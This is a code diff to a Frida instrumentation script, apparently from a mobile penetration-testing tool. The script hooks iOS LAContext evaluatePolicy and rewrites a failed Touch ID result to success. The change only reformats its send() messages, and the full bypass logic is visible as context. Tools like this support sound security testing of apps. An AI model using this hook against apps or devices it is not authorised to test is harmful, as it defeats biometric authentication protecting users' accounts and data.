@@ -14,24 +14,24 @@ resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', 
 
 if (LAContext_evaluatePolicy_localizedReason_reply.address) {
 
-    send(JSON.stringify({
+    send({
         status: 'success',
         error_reason: NaN,
         type: 'touchid-bypass',
         data: 'Hooked ' + LAContext_evaluatePolicy_localizedReason_reply.name
-    }));
+    });
 
     Interceptor.attach(LAContext_evaluatePolicy_localizedReason_reply.address, {
         onEnter: function (args) {
 
             // localizedReason:
             var reason = new ObjC.Object(args[3]);
-            send(JSON.stringify({
+            send({
                 status: 'success',
                 error_reason: NaN,
                 type: 'touchid-bypass',
                 data: 'Localized Reason for auth requirement: ' + reason.toString()
-            }));
+            });
 
             // get the original block that should run on success for reply:
             var original_block = new ObjC.Block(args[4]);
@@ -41,21 +41,21 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
             var saved_reply_block = original_block.implementation;
 
             original_block.implementation = function (success, error) {
-                send(JSON.stringify({
+                send({
                     status: 'success',
                     error_reason: NaN,
                     type: 'touchid-bypass',
                     data: 'OS authentication success response: ' + success
-                }));
+                });
 
                 if (!success == true) {
 
-                    send(JSON.stringify({
+                    send({
                         status: 'success',
                         error_reason: NaN,
                         type: 'touchid-bypass',
                         data: 'Marking OS response as True instead'
-                    }));
+                    });
 
                     // Change the success response from the OS to true
                     success = true;
@@ -64,12 +64,12 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
                 // and run the original block
                 saved_reply_block(success, error);
 
-                send(JSON.stringify({
+                send({
                     status: 'success',
                     error_reason: NaN,
                     type: 'touchid-bypass',
                     data: 'TouchID bypass run complete'
-                }));
+                });
 
             };
         }
